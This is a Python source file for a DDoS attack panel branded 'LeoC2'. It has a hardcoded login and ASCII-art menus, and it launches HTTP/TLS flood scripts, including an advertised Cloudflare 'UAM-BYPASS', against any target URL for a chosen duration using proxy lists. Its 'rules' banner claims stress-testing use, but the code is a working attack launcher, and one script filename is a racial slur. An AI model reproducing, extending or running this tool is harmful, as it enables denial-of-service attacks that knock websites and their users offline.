from os import system, name
import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx, http
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init
import socket
import sockets
import os
import re
import requests
import threading
import random
import getpass
import time
import sys

def color(data_input_output):
    random_output = data_input_output
    if random_output == "GREEN":
        data = '\033[32m'
    elif random_output == "LIGHTGREEN_EX":
        data = '\033[92m'
    elif random_output == "YELLOW":
        data = '\033[33m'
    elif random_output == "LIGHTYELLOW_EX":
        data = '\033[93m'
    elif random_output == "CYAN":
        data = '\033[36m'
    elif random_output == "LIGHTCYAN_EX":
        data = '\033[96m'
    elif random_output == "BLUE":
        data = '\033[34m'
    elif random_output == "LIGHTBLUE_EX":
        data = '\033[94m'
    elif random_output == "MAGENTA":
        data = '\033[35m'
    elif random_output == "LIGHTMAGENTA_EX":
        data = '\033[95m'
    elif random_output == "RED":
        data = '\033[31m'
    elif random_output == "LIGHTRED_EX":
        data = '\033[91m'
    elif random_output == "BLACK":
        data = '\033[30m'
    elif random_output == "LIGHTBLACK_EX":
        data = '\033[90m'
    elif random_output == "WHITE":
        data = '\033[37m'
    elif random_output == "LIGHTWHITE_EX":
        data = '\033[97m'
    return data

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxy.txt').readlines()
bots = len(proxys)

def loading():
    clear()
    print(f'''
\x1b[38;5;2m▒▒▒▒▒▐▀▀▀█▄▒▒▒▒▒▒▒▒▒\x1b[38;5;2m
\x1b[38;5;2m▒▒▒▒█▀─────█▒▒▒▒▒▒▒▒\x1b[38;5;2m
\x1b[38;5;2m▒▒▒█────▄─▄─▌▒▒▒▒▒▒▒\x1b[38;5;2m
\x1b[38;5;2m▒▒▒▌───██─█▌▌▒▒▒▒▒▒▒\x1b[38;5;2m
\x1b[38;5;2m▒▒▒▌───█▌──▌▌▒▒▒▒▒▒▒\x1b[38;5;2m
\x1b[38;5;2m▒▒▒▌────────▌▒▒▒▒▒▒▒\x1b[38;5;2m
\x1b[38;5;2m▒▒█─────────▐▒▒▒▒▒▒▒\x1b[38;5;2m
\x1b[38;5;2m▒▐▌─▐───────▐▄▄▒▒▒▒▒\x1b[38;5;2m
\x1b[38;5;2m▒▐▌─▐────────▄▀▀█▒▒▒\x1b[38;5;2m
\x1b[38;5;2m▒█──▀▄──▄█▄▀▀▒▒▒▌▀▄▒\x1b[38;5;2m
\x1b[38;5;2m▐▌────██▀█░█▄▒▄▄█▀▀▌\x1b[38;5;2m
\x1b[38;5;2m▐▌──▌▐───▐░░▐▀░░░░░▌\x1b[38;5;2m
\x1b[38;5;2m▐▌──▌────▐░░▐░░░░░░▌\x1b[38;5;2m
\x1b[38;5;2m▐───▌────▐░░▐░░░░░░\x1b[38;5;2m▌
\x1b[38;5;2m▐───█────▐░░▐░░░░░░▌\x1b[38;5;2m
\x1b[38;5;2m▐───█────▐░░▐░░░░░░▌\x1b[38;5;2m
\x1b[38;5;2m▐───█─────▀█▐▄▄▄█▀▀▒\x1b[38;5;2m
\x1b[38;5;2m▀▄▄─▐───────▄█▒▒▒▒▒▒\x1b[38;5;2m
\x1b[38;5;2m▒▒▒▀█───█▄▀▀▀▒▒▒▒▒▒▒\x1b[38;5;2m
\x1b[38;5;2m▒▒▒▒▒▀▀▀▒▒▒▒▒▒▒▒▒▒▒▒\x1b[38;5;2m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ''')
    time.sleep(1)

def si():
    print('\x1b[38;5;160m[ \x1b[38;2;233;233;233mDDOS PROXY BY TÀI LINH\x1b[38;5;160m] | \x1b[38;2;233;233;233m Welcome to banner ddos\x1b[38;5;160m| \x1b[38;2;233;233;233mOwner: Tài Linh § LeoC2\x1b[38;5;160m| \x1b[38;2;233;233;233mLeoC2')
    print("")

def rules():
    clear()
    si()
    print(f'''
\033[37m⠀⠀⠀⠀⣀⣤⣤⣶⣾⠀⠀⠀⠀⠀⠀⠀\033[35m⠀⠀⠀⠀⠀⠀⠀⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀
\033[37m⢀⣴⣶⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⣧\033[35m⣼⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀
\033[37m⠀⠀⠀⠈⠉⠛⣿⣿⣿⣿⣿⣷⣦⣀⢸⣿\033[35m⣿⡇⣀⣤⣿⣯⣿⣿⣿⣿⠟⠋⠉⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⠿⢿⣿⣿⣿⣿\033[35m⣿⣿⣿⣿⣿⠿⠿⠿⠿⠋⠀⠀⠀⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿\033[35m⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙\033[35m⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                \x1b[38;5;160m╔═══════════════╗
                                \x1b[38;5;160m║     \x1b[38;5;160mRules     \x1b[38;5;160m║
                \x1b[38;5;160m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;5;160m║ \x1b[38;5;160m1. Do not attack without someone's permission \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m3. Do not spam attacks                        \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m4. Only attack stress testing servers         \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m5. Don't skid the panel                       \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m6. Give a star to the github repository       \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m7. The creator does not do any harm           \x1b[38;5;160m║
                \x1b[38;5;160m╚═══════════════════════════════════════════════╝
''')

def layer4():
    clear()
    si()
    print(f'''
\033[37m⠀⠀⠀⠀⣀⣤⣤⣶⣾⠀⠀⠀⠀⠀⠀⠀\033[35m⠀⠀⠀⠀⠀⠀⠀⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀
\033[37m⢀⣴⣶⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⣧\033[35m⣼⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀
\033[37m⠀⠀⠀⠈⠉⠛⣿⣿⣿⣿⣿⣷⣦⣀⢸⣿\033[35m⣿⡇⣀⣤⣿⣯⣿⣿⣿⣿⠟⠋⠉⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⠿⢿⣿⣿⣿⣿\033[35m⣿⣿⣿⣿⣿⠿⠿⠿⠿⠋⠀⠀⠀⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿\033[35m⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[37m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙\033[35m⠋⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[35m LAYER 4 \033[31mDDOS IP
\033[37m UDP-KILL   \033[95m DDOS IP V4 \033[31mUPDATE..
\033[37m TCP-BYPASS \033[95m DDOS IP V6 & V4 \033[31mUPDATE..\033[0m

               ''')
               
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxy.txt').readlines()
bots = len(proxys)
               
def layer7():
    clear()
    si()
    print(f'''
\x1b[38;5;49m▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒\x1b[38;5;49m                
\x1b[38;5;49m▒▒█▒▒▒▄██████████▄▒▒▒▒\x1b[38;5;49m      \x1b[38;5;11m𝑴𝙚𝒕𝙝𝒐𝙙𝒔 𝑫𝙙𝒐𝙨 𝙋𝒓𝙤𝒙𝙮 𝙇𝒂𝙮𝒆𝙧 7 [PLAN VIP]
\x1b[38;5;49m▒█▐▒▒▒████████████▒▒▒▒\x1b[38;5;49m       ✞ \x1b[38;5;40mHTTPS-DESTROY  ATTACK TIME ➩ 120s [VIP]
\x1b[38;5;49m▒▌▐▒▒██▄▀██████▀▄██▒▒▒\x1b[38;5;49m       ✞ \x1b[38;5;40mUAM-BYPASS     ATTACK TIME ➩ 120s [VIP]
\x1b[38;5;49m▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒\x1b[38;5;49m       ✞ \x1b[38;5;40mHTTP-SOCKETS   ATTACK TIME ➩ 120s [VIP]
\x1b[38;5;49m▐┼▐▒▒██████████████▒▒▒\x1b[38;5;49m       ✞ \x1b[38;5;40mHTTPS          ATTACK TIME ➩ 120s [VIP]
\x1b[38;5;49m▐▄▐████─▀▐▐▀█─█─▌▐██▄▒\x1b[38;5;49m       ✞ \x1b[38;5;40mHTTP           ATTACK TIME ➩ 120s [VIP]
\x1b[38;5;49m▒▒█████──────────▐███▌\x1b[38;5;49m       ✞ \x1b[38;5;40mHTTPS-LOAD     ATTACK TIME ➩ 120s [VIP]
\x1b[38;5;49m▒▒█▀▀██▄█─▄───▐─▄███▀▒\x1b[38;5;49m       ✞ \x1b[38;5;40mHTTP-MARS      ATTACK TIME ➩ 120s [VIP]
\x1b[38;5;49m▒▒█▒▒███████▄██████▒▒▒\x1b[38;5;49m        ⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⟺⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰⥰    
\x1b[38;5;49m▒▒▒▒▒██████████████▒▒▒\x1b[38;5;49m
\x1b[38;5;49m▒▒▒▒▒█████████▐▌██▌▒▒▒\x1b[38;5;49m
\x1b[38;5;49m▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒\x1b[38;5;49m
\x1b[38;5;49m▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒\x1b[38;5;49m
          
                                                \x1b[38;5;10m██╗░░░░░███████╗░█████╗░  ░█████╗░██████╗░  ░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗\x1b[38;5;10m
                                                \x1b[38;5;10m██║░░░░░██╔════╝██╔══██╗  ██╔══██╗╚════██╗  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝\x1b[38;5;10m
                                               \x1b[38;5;10m ██║░░░░░█████╗░░██║░░██║  ██║░░╚═╝░░███╔═╝  ███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░\x1b[38;5;10m
                                                \x1b[38;5;10m██║░░░░░██╔══╝░░██║░░██║  ██║░░██╗██╔══╝░░  ██╔══██║░░░██║░░░░░░██║░░░██╔══██║██║░░██╗██╔═██╗░\x1b[38;5;10m
                                                \x1b[38;5;10m███████╗███████╗╚█████╔╝  ╚█████╔╝███████╗  ██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗\x1b[38;5;10m
                                                \x1b[38;5;10m╚══════╝╚══════╝░╚════╝░  ░╚════╝░╚══════╝  ╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝\x1b[38;5;10m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                             
 ''')

def menu():
    sys.stdout.write(f"         \x1b]2;LeoC2 | USERS Admin\x07")
    clear()
    print('')
    print("")
    print("")
    print("""\x1b[38;5;198m\x1b[38;5;198m\x1b[38;5;198m\x1b[38;5;198m\x1b[38;5;198m\x1b[38;5;198m
\x1b[38;5;40m░░░░░░░░░░░░░░░░▓██████▓▓▓░░░░░░░░░░░░░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░░░░░░░░░░█████▓▓█████████▓░░░░░░░░░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░░░░░░░█████▓░░▓█████████████░░░░░░░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░░░░░▓███▓░░░▓█████████████████░░░░░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░░░░███▓░░░░░███████████████████▓░░░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░░░███░░░░░░██████████████████████░░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░░███░░░░░░░███████████████████████░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░███░░░░░░░░███████░░░░██████████▓█▓░░\x1b[38;5;40m
\x1b[38;5;40m░░░███▓░░░░░░░░███████░░░░▓██████████▓█░░\x1b[38;5;40m
\x1b[38;5;40m░░▓███░░░░░░░░░░██████▓░░▓███████████▓██░\x1b[38;5;40m
\x1b[38;5;40m░░████░░░░░░░░░░▓████████████████████▓▓█░\x1b[38;5;40m
\x1b[38;5;40m░▓█░█▓░░░░░░░░░░░░████████████████████░██\x1b[38;5;40m
\x1b[38;5;40m░██░█░░░░░░░░░░░░░░▓██████████████████░██\x1b[38;5;40m
\x1b[38;5;40m░█▓░█░░░░░░░░░░░░░░░░░▓███████████████░▓█\x1b[38;5;40m
\x1b[38;5;40m▓█▓░█▓░░░░░░░░░░░░░░░░░░██████████████░░█\x1b[38;5;40m
\x1b[38;5;40m██░░██░░░░░░░░░░░▓▓░░░░░░▓████████████░░█\x1b[38;5;40m
\x1b[38;5;40m██░▓░█░░░░░░░░░░████▓░░░░░███████████▓░░█\x1b[38;5;40m
\x1b[38;5;40m██░█░██░░░░░░░░▓█████░░░░░░██████████░░▓█\x1b[38;5;40m
\x1b[38;5;40m██░▓█░██░░░░░░░░████▓░░░░░░█████████░░▓▓█\x1b[38;5;40m
\x1b[38;5;40m▓█░░█░░█▓░░░░░░░░▓▓░░░░░░░░████████▓░░▓██\x1b[38;5;40m
\x1b[38;5;40m░█░░█▓░▓██░░░░░░░░░░░░░░░░░███████▓░░█▓█▓\x1b[38;5;40m
\x1b[38;5;40m░██░███████▓░░░░░░░░░░░░░░██████████▓█▓█░\x1b[38;5;40m
\x1b[38;5;40m░▓█░██▓░░░▓███░░░░░░░░░░▓██████▓░░░▓██▓█░\x1b[38;5;40m
\x1b[38;5;40m░░███▓░░░░░░░███████████████▓░░░░░░░░██▓░\x1b[38;5;40m
\x1b[38;5;40m░░░██░░▓▓█▓▓▓░░░▓████████▓░░░░▓▓█▓▓░░██░░\x1b[38;5;40m
\x1b[38;5;40m░░░▓█░████████▓░░░░░░░░░░░░▓████████░▓█░░\x1b[38;5;40m
\x1b[38;5;40m░░░█▓▓███████████░░░░░░░░████████████░█▓░\x1b[38;5;40m
\x1b[38;5;40m░░░█░█████████████░░░░░░█████████████░██░\x1b[38;5;40m
\x1b[38;5;40m░░▓█░▓████████████░░░░░░█████████████░░█░\x1b[38;5;40m
\x1b[38;5;40m░░▓█░▓▓███████████░░░░░░███████████▓▓░░█░\x1b[38;5;40m
\x1b[38;5;40m░░▓█░░░▓█████████░░░░░░░░█████████▓░░░░█░\x1b[38;5;40m
\x1b[38;5;40m░░░█▓░░░████████░░░░░░░░░░████████░░░░██░\x1b[38;5;40m
\x1b[38;5;40m░░░██░░░░░█████░░░░████░░░░█████▓░░░░░█▓░\x1b[38;5;40m
\x1b[38;5;40m░░░░██░░░░░░░░░░░░██████░░░░░░░░░░▓░░██░░\x1b[38;5;40m
\x1b[38;5;40m░░░░▓████▓░░░░░░░░███▓██▓░░░░░░░░█████░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░░▓█▓████▓░░░░░██░▓▓██░░░░▓████░██░░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░░░░░▓█▓██░▓░░░██▓▓▓██░░█▓█████░░░░░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░░░░░▓█░███▓░░░▓▓▓░▓░░░░░█▓██▓█░░░░░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░░░░░▓█░██▓░░▓░░░░░░░░░▓░███▓▓█░░░░░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░░░░░▓█░███▓███▓░░░░░▓███▓██░▓█░░░░░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░░░░░██░░██░▓░█████████░▓▓█▓░▓█░░░░░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░░░░░▓█░░▓██▓▓░░▓░█░█░▓░▓██░░░█░░░░░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░░░░░░█▓░░████░▓░░▓░░▓▓███░░░██░░░░░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░░░░░░▓█▓░░████████▓█████░░░██▓░░░░░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░░░░░░░░██░░▓▓▓▓▓▓▓▓▓▓▓█░░░██░░░░░░░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░░░░░░░░░██░░▓█████▓██▓░░▓██░░░░░░░░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░░░░░░░░░░██░░░░░▓▓░░░░░███░░░░░░░░░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░░░░░░░░░░░██░░░░░░░░░░██▓░░░░░░░░░░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░░░░░░░░░░░▓██░░░░░░░░██░░░░░░░░░░░░░░\x1b[38;5;40m
\x1b[38;5;40m░░░░░░░░░░░░░░░░██████████░░░░░░░░░░░░░░░\x1b[38;5;40m
             \x1b[38;5;198m\x1b[38;5;198m\x1b[38;5;198m\x1b[38;5;198m\x1b[38;5;198m\x1b[38;5;198m
         ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
         ┣➤\x1b[38;5;87mCONMAND\x1b[38;5;87m"HELP" SHOW ALL METHODS\x1b[38;5;197m LAYER7
""")


def main():
    menu()
    while(True):
        cnc = input(''' \033[47m\033[31mRoot●\033[95mLeoC2\033[0m \033[31m$\033[37m ''')
        if cnc == "methods" or cnc == "METHODS" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        if cnc == "method" or cnc == "METHOD" or cnc == "L4" or cnc == "l4":
            layer4()
#Method
                
        elif "HTTPS-DESTROY" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node tls-bartrick.js {target} {time} 64 5 proxy.txt')
            except IndexError:
                print('Usage: HTTPS-DESTROY <target> <time>')
                print('Example: HTTPS-DESTROY http://example.com 100') 
                
        elif "UAM-BYPASS" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node spike-duc.js {target} {time}')
            except IndexError:
                print('Usage: UAM-BYPASS <target> <time>')
                print('Example: UAM-BYPASS http://example.com 120')
                
        elif "HTTP-SOCKETS" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RATE.js {target} {time}')
            except IndexError:
                print('Usage:  <target> <time>')
                print('Example: HTTP-SOCKETS http://example.com 120')
                
        elif "HTTPS" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-NIGGA.js {target} {time}')
            except IndexError:
                print('Usage: HTTP-STORM <target> <time>')
                print('Example: HTTP-STORM http://example.com 120')
                
        elif "HTTP" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node 404.js {target} {time} 64 5 proxy.txt')
            except IndexError:
                print('Usage: HTTP <target> <time>')
                print('Example: HTTP http://example.com 120')

        elif "HTTPS-LOAD" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node http-smack.js {target} {time} 64 5 proxy.txt')
            except IndexError:
                print('Usage: HTTP-SMACK <target> <time>')
                print('Example: HTTP-SMACK  http://example.com 100')
                
        elif "HTTP-MARS" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node AQUNET-TLS.js {target} {time} 64 5 proxy.txt')
            except IndexError:
                print('Usage: HTTP-MARS <target> <time>')
                print('Example: HTTP-MARS  http://example.com 100')
                
        elif "HELP" in cnc:
            print(f'''
                     \033[37m╔══════════════════════════════╗
                       \033[37mMETHODS  ► \033[31mSHOW LAYER7 METHODS
                       \033[37mMETHOD ► \033[31mSHOW LAYER4 METHOD
                       \033[37mBANNERS ► \033[31mSHOW BANNERS
                       \033[37mRULES   ► \033[31mRULES PANEL
                       \033[37mPORTS   ► \033[31mSHOW ALL PORTS
                       \033[37mTOOLS   ► \033[31mSHOW TOOLS
                       \033[37mCLEAR   ► \033[31mCLEAR TERMINAL
                     \033[37m╚══════════════════════════════╝ \033[0m
                      
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("\033[33mDDOS PROXY BY TÀI LINH: [ " + cmmnd + " ] SHOW FULL\033[0m")
            except IndexError:
                pass
                     
def login():
    clear()
    user = "ADMIN"
    passwd = "LINH"
    print("Welcome To Ddos Proxy By Tài Linh")
    print("Please Login")
    time.sleep(1)
    clear()
    print("""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

\x1b[38;5;10m\033[37mWELCOME TO \033[99mDDOS PROXY BY TÀI LINH\033[99m ADMIN LeoC2


\x1b[38;5;165m	▒▒▒▒▒▒▒▒▒▒▒▄▄▄▄░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒\x1b[38;5;165m	    
\x1b[38;5;165m	▒▒▒▒▒▒▒▒▒▄██████▒▒▒▒▒▄▄▄█▄▒▒▒▒▒▒▒▒▒▒\x1b[38;5;165m	
\x1b[38;5;165m	▒▒▒▒▒▒▒▄██▀░░▀██▄▒▒▒▒████████▄▒▒▒▒▒▒\x1b[38;5;165m	
\x1b[38;5;165m	▒▒▒▒▒▒███░░░░░░██▒▒▒▒▒▒█▀▀▀▀▀██▄▄▒▒▒\x1b[38;5;165m	
\x1b[38;5;165m	▒▒▒▒▒▄██▌░░░░░░░██▒▒▒▒▐▌▒▒▒▒▒▒▒▒▀█▄▒\x1b[38;5;165m	
\x1b[38;5;165m	▒▒▒▒▒███░░▐█░█▌░██▒▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▀▌\x1b[38;5;165m	
\x1b[38;5;165m	▒▒▒▒████░▐█▌░▐█▌██▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒\x1b[38;5;165m	
\x1b[38;5;165m	▒▒▒▐████░▐░░░░░▌██▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒\x1b[38;5;165m	            
\x1b[38;5;165m	▒▒▒▒████░░░▄█░░░██▒▒▐█▒▒▒▒▒▒▒▒▒▒▒▒▒▒\x1b[38;5;165m	
\x1b[38;5;165m	▒▒▒▒████░░░██░░██▌▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒\x1b[38;5;165m	
\x1b[38;5;165m	▒▒▒▒████▌░▐█░░███▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒\x1b[38;5;165m	
\x1b[38;5;165m	▒▒▒▒▐████░░▌░███▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒\x1b[38;5;165m	
\x1b[38;5;165m	▒▒▒▒▒████░░░███▒▒▒▒█▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒\x1b[38;5;165m	
\x1b[38;5;165m	▒▒▒██████▌░████▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒\x1b[38;5;165m	
\x1b[38;5;165m	▒▐████████████▒▒███▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒\x1b[38;5;165m	
\x1b[38;5;165m	▒█████████████▄████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒\x1b[38;5;165m	
\x1b[38;5;165m	██████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒\x1b[38;5;165m	
\x1b[38;5;165m	██████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒\x1b[38;5;165m	
\x1b[38;5;165m	█████████████████▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒\x1b[38;5;165m	
\x1b[38;5;165m	█████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒\x1b[38;5;165m	
\x1b[38;5;165m	████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒\x1b[38;5;165m	
\x1b[38;5;165m	████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒\x1b[38;5;165m	

""")
    username = input(" \x1b[38;5;200m●Username►\x1b[38;5;226m")
    password = getpass.getpass(prompt=' \x1b[38;5;200m●Password►\x1b[38;5;226m')
    if username != user or password != passwd:
        print("")
        print(" \033[31m</> PASSWORD ERROR!...")
        sys.exit(1)
    elif username == user and password == passwd:
        print(" \033[32m</> PASSWORD GOOD!:) ")
        time.sleep(0.1)
        loading()
        main()

login()


